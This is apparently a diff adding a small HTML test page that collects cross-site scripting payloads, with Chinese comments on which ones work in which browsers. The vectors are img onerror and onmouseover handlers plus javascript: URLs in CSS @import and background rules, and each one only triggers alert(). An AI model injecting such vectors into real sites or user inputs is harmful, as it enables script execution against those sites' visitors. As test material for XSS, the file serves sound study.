@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+
+<!-- 下面二种方式测试都可以-->
+<img src='#' onerror="alert(-1)" />
+<img   src='#' onmouseover="alert(-2)"/>
+
+
+<!-- 下面三种方式低版本浏览器才行-->
+<style>@import 'javascript:eval(alert(00))';</style>
+<style type="text/css">
+    body {
+        background:url("javascript:alert(11)")
+    }
+</style>
+<div style="background: url('javascript:alert(22)')"></div>
+
+<!--  通过注释HTML让中间都不显示,两个input输出 -->
+</body>
+</html>
